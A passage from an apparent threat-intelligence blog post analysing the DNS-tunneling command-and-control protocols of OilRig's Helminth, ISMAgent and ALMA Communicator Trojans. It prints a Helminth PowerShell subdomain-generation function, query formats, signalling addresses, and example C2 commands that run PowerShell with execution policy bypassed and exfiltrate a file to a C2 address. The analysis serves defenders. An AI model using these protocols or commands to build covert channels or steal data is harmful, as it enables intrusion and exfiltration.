						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f692892e1b73004755182-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">GetSub</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">myflag2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">cmdid</span><span class="crayon-o">=</span><span class="crayon-s">'00'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">partid</span><span class="crayon-o">=</span><span class="crayon-s">'000'</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b73004755182-2">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b73004755182-3"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b73004755182-4">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b73004755182-5"><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">myflag2</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b73004755182-6">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b73004755182-7"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b73004755182-8">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b73004755182-9"><span class="crayon-sy">(</span><span class="crayon-s">'zz000000'</span><span class="crayon-o">+</span><span class="crayon-sy">(</span><span class="crayon-v">convertTo</span><span class="crayon-o">-</span><span class="crayon-e">Base36</span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">Random</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Maximum</span><span class="crayon-h"> </span><span class="crayon-cn">46655</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b73004755182-10">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b73004755182-11"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b73004755182-12">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b73004755182-13"><span class="crayon-st">elseif</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">myflag2</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b73004755182-14">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b73004755182-15"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b73004755182-16">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b73004755182-17"><span class="crayon-sy">(</span><span class="crayon-s">'zz'</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-m">global</span><span class="crayon-o">:</span><span class="crayon-v">myid</span><span class="crayon-o">+</span><span class="crayon-s">'00000'</span><span class="crayon-o">+</span><span class="crayon-sy">(</span><span class="crayon-v">convertTo</span><span class="crayon-o">-</span><span class="crayon-e">Base36</span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">Random</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Maximum</span><span class="crayon-h"> </span><span class="crayon-cn">46655</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b73004755182-18">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b73004755182-19"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b73004755182-20">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b73004755182-21"><span class="crayon-st">elseif</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">myflag2</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">eq</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b73004755182-22">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b73004755182-23"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b73004755182-24">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b73004755182-25"><span class="crayon-sy">(</span><span class="crayon-s">'zz'</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-m">global</span><span class="crayon-o">:</span><span class="crayon-v">myid</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">cmdid</span><span class="crayon-o">+</span><span class="crayon-sy">$</span><span class="crayon-v">partid</span><span class="crayon-o">+</span><span class="crayon-sy">(</span><span class="crayon-v">convertTo</span><span class="crayon-o">-</span><span class="crayon-e">Base36</span><span class="crayon-sy">(</span><span class="crayon-v">Get</span><span class="crayon-o">-</span><span class="crayon-v">Random</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Maximum</span><span class="crayon-h"> </span><span class="crayon-cn">46655</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b73004755182-26">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b73004755182-27"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f692892e1b73004755182-28">&nbsp;</div><div class="crayon-line" id="crayon-5f692892e1b73004755182-29"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 4. Code in Helminth &#8220;ww&#8221; variant used to generate subdomains</em></span></p>
<p>The Helminth variant that uses “00” as the first characters of generated subdomains is the first variant of this Trojan that we analyzed from an <a href="https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/">attack campaign on Saudi Arabian targets back in May 2016</a>. During the explanation of the DNS tunneling, the “00” variant will be the main focus, but as the figures above suggest, the “ww” and “zz” variants are exactly the same just using different characters for the first two bytes of the subdomain.</p>
<p>The Helminth variant relies on DNS Type A requests to resolve custom crafted subdomains at the C2 domain to obtain IPv4 answers that it will ultimately parse and treat as data. It issues these DNS queries using the GetHostByName method in the System.Net.DNS class. The Helminth tool will use the downloaded data to create a batch script that it will run and upload the results to the C2 via the DNS tunnel. To carry out this activity, the Helminth tool looks for two hardcoded IP addresses within the response to its initial DNS query.</p>
<table width="631">
<tbody>
<tr>
<td width="99"><strong>IP Address</strong></td>
<td width="531"><strong>Description</strong></td>
</tr>
<tr>
<td width="99">33.33.x.x</td>
<td width="531">Provides script filename and instructs the Trojan to start downloading data to save to the batch script.</td>
</tr>
<tr>
<td width="99">35.35.35.35</td>
<td width="531">Instructs the Trojan to stop downloading data and to execute the downloaded batch script.</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 3. IPv4 addresses used by Helminth for data transfer through the DNS tunnel</em></span></p>
<p>The Helminth Trojan initiates the conversation with its C2 server by issuing a DNS query to resolve a special subdomain that acts as a beacon. The C2 will respond to this beacon with an IPv4 address in the DNS answer that the Trojan will use to obtain a unique system identifier from the C2, specifically converting the number in the first octet of the IPv4 to a character and using this character to uniquely identify the system in subsequent DNS queries. The initial beacon to obtain a system identifier from the C2 has the following structure:</p>
<p><span style="font-family: 'courier new', courier, monospace;">00000000&lt;base36 encoded random number less than 46655&gt;&lt;sequence number “30”&gt;.&lt;c2 domain&gt;</span></p>
<p>Figure 5 shows this initial beacon that includes the hardcoded string of eight zeros (“00000000”), followed by three characters for the base36 encoded random number and a sequence number of “30”, which represents the character “0”. Figure 5 also shows the C2 server providing an IPv4 address of “35.0.0.0” as the answer to the DNS request. This IP address instructs the Trojan use the character “5” as a unique system identifier, as the number 35 represents the “5” character in ASCII. The Trojan will use this identifier in subsequent queries that the C2 server will use to identify the system.</p>
<p><img class="alignnone size-full wp-image-96618" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure5.png" alt="" width="974" height="81" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure5.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure5-900x75.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure5-300x25.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure5-768x64.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure5-370x31.png 370w" sizes="(max-width: 974px) 100vw, 974px" /></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 5 Initial beacon from Helminth and the C2 replying with a unique system identifier</span></em></p>
<p>The next query includes the system identifier provided by the C2 as the third character in the subdomain, followed by the base36 encoded random number and the sequence number “30”, which represents the character “0”. This query has the following structure, which reuses the “30” sequence number as the Trojan has not begun receiving data yet:</p>
<p><span style="font-family: 'courier new', courier, monospace;">00&lt;system identifier&gt;00000&lt;base36 encoded random number less than 46655&gt;&lt;sequence number “30”&gt;.&lt;c2 domain&gt;</span></p>
<p>The C2 will respond to this query with an answer that contains an IPv4 address that is structured as “33.33.x.x”, which Helminth will treat the last two octets as integers (“x.x”) and converts them to characters to use as the name of the batch file used to store the downloaded script. Helminth will concatenate the “.bat” file extension to these two characters to create the batch script and will begin issuing additional DNS queries and treat future IPv4 addresses in responses as data that it will write to this file. Figure 6 shows the query containing the system identifier and the C2 responding with an IPv4 answer of “33.33.97.97”, which Helminth will use “97.97” to create a file named “aa.bat”, as the number 97 represents the “a” character in ASCII.</p>
<p><img class="alignnone size-full wp-image-96619" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure6.png" alt="" width="968" height="77" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure6.png 968w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure6-900x72.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure6-300x24.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure6-768x61.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure6-370x29.png 370w" sizes="(max-width: 968px) 100vw, 968px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 6. C2 providing Helminth with the two character filename</em></span></p>
<p>To download data from the C2, Helminth will issue DNS queries that have the following structure, which is similar to the previous query used to obtain the filename, however, these requests include a hardcoded string “232A” followed by the hexadecimal representation of the two characters used for the filename:</p>
<p><span style="font-family: 'courier new', courier, monospace;">00&lt;system identifier&gt;00000&lt;base 36 encoded random number less than 46655&gt;232A&lt;hexlified characters for filename&gt;&lt;sequence number&gt;.&lt;c2 domain&gt;</span></p>
<p>The C2 server will begin providing IPv4 addresses that the Trojan will treat each octet as the base10 representation of the binary data. The Trojan will write each byte to the batch file and continue to do so until the C2 provides the IPv4 address of “35.35.35[.]35” as a DNS answer, which instructs the Trojan to stop writing data to the file and run the file as a batch script.</p>
<p>Figure 7 shows the C2 server providing the “33.33.97[.]97” IPv4 address instructing the Trojan to create a file name “aa.bat”. The screenshot then shows the Trojan issuing DNS queries with incrementing sequence numbers (“31”, “32” and “33” for 1, 2 and 3), which the C2 is responding with two IPv4 addresses to transmit the data (119.104.111[.]97 and 109.105.32[.]32 to transmit the string “whoami”) followed by the “35.35.35[.]35” address to end the data transmission.</p>
<p><img class="alignnone size-full wp-image-96620" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure7.png" alt="" width="977" height="114" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure7.png 977w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure7-900x105.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure7-300x35.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure7-768x90.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure7-370x43.png 370w" sizes="(max-width: 977px) 100vw, 977px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 7. Helminth requesting data from the C2 server until receiving the IPv4 35.35.35[.]35 to stop the data transfer</em></span></p>
<p>Once it receives the “35.35.35[.]35” address, Helminth will run the downloaded batch script and save the output of the script to a text file whose name has the same two characters as the batch script. For instance, in the above example the Trojan would save the output of the “aa.bat” script to “aa.txt”. The Trojan will upload the contents of this text file to the C2 server via a series of DNS queries that have the following structure:</p>
<p><span style="font-family: 'courier new', courier, monospace;">00&lt;system identifier&gt;&lt;characters for filename&gt;&lt;sequence number&gt;&lt;base 36 encoded random number less than 46655&gt;&lt;up to 48 characters for a maximum of 24-bytes of hexlified data&gt;.&lt;c2 domain&gt;</span></p>
<p>The Trojan splits the contents of the text file up into 24-byte chunks and converts each byte into its hexadecimal representation. Helminth will include the hexadecimal representation of these bytes within the subdomain and will issue a DNS query to transmit the data to the C2 server. The Trojan will continue this process until all of the 24-byte chunks are sent to the C2, with each query including an incrementing sequence number. Helminth does nothing with the C2 server’s answer to these queries, as it just makes sure the DNS server responded with any answer. Figure 8 shows the Helminth Trojan uploading the contents of the text file that contains the results of the batch script (“whoami” command) to the C2 server in a series of five DNS queries.</p>
<p><img class="alignnone size-full wp-image-96621" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure8.png" alt="" width="985" height="162" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure8.png 985w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure8-900x148.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure8-300x49.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure8-768x126.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure8-370x61.png 370w" sizes="(max-width: 985px) 100vw, 985px" /></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 8. Helminth sending the results of the command within queried subdomains</span></em></p>
<h1>ISMAgent</h1>
<p>OilRig has used the ISMAgent tool in targeted attacks, one of which we publicly discussed in our blog titled <a href="https://unit42.paloaltonetworks.com/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/">OilRig Uses ISMDoor Variant; Possibly Linked to Greenbug Threat Group</a>. OilRig’s use of this tool was an interesting discovery, as ISMAgent uses a DNS tunneling protocol very similar to another tool called ISMDoor that had been linked to another group called Greenbug. Researchers have already explained ISMDoor’s tunneling protocol <a href="https://www.netscout.com/blog/asert/greenbugs-dns-isms">here</a>, so we will focus on explaining ISMAgent’s DNS tunneling protocol.</p>
<p>ISMAgent uses the DnsQuery_A API function to issue DNS AAAA requests to resolve custom crafted subdomains at an actor owned domain to send data to and receive commands from OilRig. The Trojan will initiate data transfer by issuing a beacon that contains a unique session identifier generated by calling the CoCreateGuid API function and using the resulting GUID with its hyphens removed. ISMAgent then uses this session identifier within a subdomain with the following structure that it will attempt to resolve:</p>
<p><span style="font-family: 'courier new', courier, monospace;">n.n.c.&lt;GUID used for session ID&gt;.&lt;c2 domain&gt;</span></p>
<p>ISMAgent performs an AAAA query to resolve the domain, which effectively notifies the C2 that it is about to send data. If the C2 is operational, it will respond to this beacon with an IPv6 address of ‘a67d:0db8:a2a1:7334:7654:4325:0370:2aa3’ to acknowledge that it received the beacon and is ready to handle the data ISMAgent will attempt to send it. After receiving the acknowledgment IPv6 from the C2 server, the Trojan build a string that has the following structure:</p>
<p><span style="font-family: 'courier new', courier, monospace;">http://&lt;IP of C2 domain&gt;/action2/&lt;base64 encoded computername\username&gt;||</span></p>
<p>ISMAgent will base64 encode the string above (converting “=”, “/” and “+” to “-“, “-s-“ and “-p-“ respectively) and then sends the encoded data to the C2 in a series DNS queries to resolve domains that have the following structure:</p>
<p><span style="font-family: 'courier new', courier, monospace;">&lt;up to 13 characters of base64 encoded data&gt;.&lt;iterating sequence number&gt;.d.&lt;GUID used for session ID&gt;.&lt;c2 domain&gt;</span></p>
<p>The C2 will respond with a hardcoded IPv6 of “a67d:0db8:85a3:4325:7654:8a2a:0370:7334” to tell the Trojan that it received the data and to continue sending data. Once it has sent all the data to the C2 server, ISMAgent will issue a query to resolve a domain with the following structure to notify the C2 server it is done sending data:</p>
<p><span style="font-family: 'courier new', courier, monospace;">n.&lt;number of queries issued to send data&gt;.f.&lt;GUID used for session ID&gt;.&lt;c2 domain&gt;</span></p>
<p>Figure 9 shows Wireshark displaying the ISMAgent beacon followed by the Trojan sending data to the C2 server. Figure 9 also shows that the C2 uses very specific IPv6 addresses as answers to the queries, specifically including the IPv6 addresses used for acknowledgement and to instruct the Trojan to continue sending data. Lastly, the screenshot shows a third IPv6 used to answer the last DNS query, which the Trojan will use to determine how many DNS requests it needs to issue to download data from the C2.</p>
<p><img class="alignnone size-full wp-image-96622" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure9.png" alt="" width="977" height="320" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure9.png 977w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure9-900x295.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure9-300x98.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure9-768x252.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure9-370x121.png 370w" sizes="(max-width: 977px) 100vw, 977px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 9. ISMAgent&#8217;s initial beacon followed by the transfer of system data “action2” in the queried subdomains</em></span></p>
<p>Figure 9 showed the C2 server providing an IPv6 address as an answer to the query that ISMAgent issued to mark the completion of data transfer. ISMAgent will parse this IPv6 to make sure it starts with “a67d:0db8:85a3:4325:7654” and then uses the last two hexadectets as a number of DNS queries it should issue to download data from the C2 server. The Trojan will issue queries to resolve domains with the following structure and treats the IPv6 addresses in the answers as data:</p>
<p><span style="font-family: 'courier new', courier, monospace;">www.&lt;sequence number [0:count from C2 server-1]&gt;.r.&lt;GUID used for session ID&gt;.&lt;c2 domain&gt;</span></p>
<p>Figure 10 shows the C2 server responding to a query with an IPv6 address that begins with “a67d:0db8:85a3:4325:7654” and ends with 11, which instructs ISMAgent to issue 11 DNS queries to download data. The screenshot then shows ISMAgent issuing 11 DNS requests that the C2 server responds with data structured as follows:</p>
<p><span style="font-family: 'courier new', courier, monospace;">&lt;GUID used as a unique system identifier&gt;#command#&lt;URL to download a file&gt;#&lt;command to run with cmd.exe&gt;#&lt;file to upload to c2&gt;#</span></p>
<p>In Figure 10, the C2 provided IPv6 addresses that transmitted the following data to the ISMAgent Trojan, which would run a PowerShell script that writes text to a file “C:\Users\Public\file.txt:</p>
<p><span style="font-family: 'courier new', courier, monospace;">2983b983-0acd-42db-9d86-0b096af5f369#command##powershell.exe -executionpolicy bypass \&#8221;$s = &#8216;Text written to file.txt&#8217;;$s | set-content &#8216;c:\\Users\\Public\\file.txt&#8217;\&#8221;#</span></p>
<p><img class="alignnone size-full wp-image-96623" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure10.png" alt="" width="977" height="350" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure10.png 977w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure10-900x322.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure10-300x107.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure10-768x275.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure10-370x133.png 370w" sizes="(max-width: 977px) 100vw, 977px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 10. ISMAgent downloading data from the C2 within IPv6 answers that the Trojan will treat as a command</em></span></p>
<p>The next beacon sent by ISMAgent follows the same process as the initial beacon, including the query to resolve “n.n.c” followed by the data transfer requests with the base64 encoded data in the subdomain and finishing with the “n.&lt;requests sent&gt;.f” query. The data transferred differs from the initial beacon, as it includes the GUID provided by the C2 in the previous beacon and the URL contains the word “response” instead of “action2”. The data sent to the C2 has the following structure, which the word “response” notifies the C2 that it is responding the previous transmission of the GUID:</p>
<p><span style="font-family: 'courier new', courier, monospace;">http://&lt;IP of c2 domain&gt;/response/&lt;base64 encoded computername\username&gt;/&lt;GUID provided by C2 as a unique system identifier&gt;||</span></p>
<p>Figure 11 shows the DNS requests that ISMAgent issues to send this data to the C2 server. As you can see from the query to resolve the “n.12.f.” subdomain, ISMAgent sent 12 queries to transmit the encoded data to the C2 server via the DNS tunnel.</p>
<p><img class="alignnone size-full wp-image-96624" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure11.png" alt="" width="949" height="364" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure11.png 949w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure11-900x345.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure11-300x115.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure11-768x295.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure11-370x142.png 370w" sizes="(max-width: 949px) 100vw, 949px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 11. ISMAgent sending data “response” to the C2 server within queried subdomains</em></span></p>
<p>To show how ISMAgent exfiltrates data from the system, we issued the following command from the C2 server:</p>
<p><span style="font-family: 'courier new', courier, monospace;">2983b983-0acd-42db-9d86-0b096af5f369#command###C:\\Users\\Public\\file.txt</span></p>
<p>The C2 issues this command within IPv6 addresses provided as answers to five queries seen in Figure 12. The command instructs ISMAgent to read the “C:\Users\Public\file.txt” file and upload its contents to the C2 server. If you recall, the string “Text written to file.txt” was written to this file from the PowerShell script executed by the initial command issued by the C2 server in Figure 11 above.</p>
<p><img class="alignnone size-full wp-image-96625" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure12.png" alt="" width="964" height="191" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure12.png 964w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure12-900x178.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure12-300x59.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure12-768x152.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure12-370x73.png 370w" sizes="(max-width: 964px) 100vw, 964px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 12. ISMAgent downloading data from the C2 within IPv6 addresses</em></span></p>
<p>ISMAgent will read the file and send its contents to the C2 server via the same sequence of DNS queries as before. The following shows the structure of the data uploaded, which is similar to but differs from previous data transferred, specifically including the string “upload” in the URL and the contents of the uploaded file following the double pipe (“||”) characters.</p>
<p><span style="font-family: 'courier new', courier, monospace;">http://&lt;IP of c2 domain&gt;/upload/&lt;base64 encoded computername\username&gt;/&lt;GUID provided by C2 as a unique system identifier&gt;||&lt;contents of file uploaded&gt;</span></p>
<p>Figure 13 shows ISMAgent uploading the contents of the “file.txt” file by sending the following data in encoded form to the C2 in 15 DNS queries:</p>
<p><span style="font-family: 'courier new', courier, monospace;">http://172.16.107[.]128/upload/V0lOLURQUUNPTkJMMU44XFJpY2sgRW5nbGlzaA%3d%3d/2983b983-0acd-42db-9d86-0b096af5f369||Text written to file.txt\r\n</span></p>
<p><img class="alignnone size-full wp-image-96626" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure13.png" alt="" width="949" height="456" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure13.png 949w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure13-380x184.png 380w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure13-900x432.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure13-300x144.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure13-768x369.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure13-370x178.png 370w" sizes="(max-width: 949px) 100vw, 949px" /></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 13. ISMAgent uploading data to the C2 via the queried subdomains</span></em></p>
<h1>ALMA Communicator</h1>
<p>While tracking OilRig, we observed the threat group delivering two different variants of a tool called ALMA communicator as a payload. The two variants use DNS tunneling as its C2 channel, but the structure of the domains generated differ enough to describe them separately.</p>
<h2>ALMA dash</h2>
<p>The dash variant of ALMA was the first ALMA Communicator variant we discovered and was the focal point of our blog titled <a href="https://unit42.paloaltonetworks.com/unit42-oilrig-deploys-alma-communicator-dns-tunneling-trojan/">OilRig Deploys “ALMA Communicator” – DNS Tunneling Trojan</a>. Like other tools used by OilRig, ALMA uses two separate folders named “Download” and “Upload” to store files that it receives from the C2 and to store files that it will exfiltrate to the C2. The ALMA dash tool will use a custom DNS tunneling protocol to download files provided by the C2 server and save these files in the “Download” folder. ALMA dash will routinely check the contents of the second folder named “Upload” and use the custom DNS tunneling protocol to exfiltrate the contents of each file in this folder.</p>
<p>ALMA dash’s custom DNS tunneling protocol relies on DNS A record queries to resolve custom crafted subdomains at the actor controlled C2 domain. ALMA dash builds the subdomains and uses the DnsQuery_W function to issue these DNS queries. OilRig transmits data via IPv4 addresses within the answers to these queries, which ALMA will save to the “Download” folder and execute using CreateProcessA with the command line of “cmd /c &lt;downloaded file&gt;”. The results of the command are saved to a file in the “Upload” folder that ALMA will exfiltrate to the C2 server.</p>
<p>ALMA dash generates a unique identifier for the system by gathering the user name and windows product key and combining the two strings together with an underscore (“_”) between them. The Trojan obtains the username via the GetUserNameA function and gathers the Windows product id by querying the registry, specifically the key <span style="font-family: 'courier new', courier, monospace;">SOFTWARE\Microsoft\Windows NT\CurrentVersion\ ProductId</span>. ALMA will then generate the MD5 hash for this string and use characters at specific offsets (offsets 1, 5, 9, 13, 17, 21, 25 and 29) in this MD5 hash to create an 8-character string that it will use as the unique identifier for the system.</p>
<p>With the unique identifier created, ALMA dash initiates communications with the C2 server by sending a beacon to the C2 server using a DNS query to resolve a custom crafted subdomain at the actor-controlled C2 domain. ALMA issues these beacons to notify the C2 that it seeks to download data.</p>
<p><span style="font-family: 'courier new', courier, monospace;">[random number between 1-9998]ID[unique identifier from MD5 hash of system information][sequence number]-0-2D-2D.[C2 domain]</span></p>
<p>Figure 14 shows the initial beacon sent from ALMA dash to its C2 server, including a random number of “6813”, a unique identifier of “8faa2150”, a sequence number of “0” and a hardcoded “-0-2D-2D&#8221; string used for the beacon.</p>
<p><img class="alignnone size-full wp-image-96627" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure14.png" alt="" width="920" height="79" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure14.png 920w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure14-900x77.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure14-300x26.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure14-768x66.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure14-370x32.png 370w" sizes="(max-width: 920px) 100vw, 920px" /></p>
<p style="text-align: center;"><em><span style="font-size: 10pt;">Figure 14. ALMA Communicator&#8217;s initial beacon to the C2</span></em></p>
<p>The authoritative DNS server for the C2 domain will send data to ALMA dash within the IPv4 answers to the query. The DNS server will use a hardcoded IPv4 address of <span style="font-family: 'courier new', courier, monospace;">36.37.94[.]33 ($%^!)</span>within answer to instruct the Trojan to begin treating all future IPv4 addresses within answers as data. To obtain the entire data stream, ALMA dash will continue to issue queries to resolve subdomains using the format above; however, ALMA will generate a new random number each query to avoid caching. ALMA dash will continue to send queries until it receives the IPv4 address of <span style="font-family: 'courier new', courier, monospace;">33.33.94[.]94 (!!^^)</span>, which the C2 server will send when it is finished sending data. Figure 15 shows the C2 server answering the ALMA beacon with an IPv4 address of “36.37.94[.]33” to tell the Trojan to begin treating subsequent IPv4 as data.</p>
<p><img class="alignnone size-full wp-image-96628" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure15.png" alt="" width="962" height="187" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure15.png 962w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure15-900x175.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure15-300x58.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure15-768x149.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/04/Figure15-370x72.png 370w" sizes="(max-width: 962px) 100vw, 962px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 15. C2 server responds to ALMA&#8217;s beacon with data in the IPv4 answers</em></span></p>
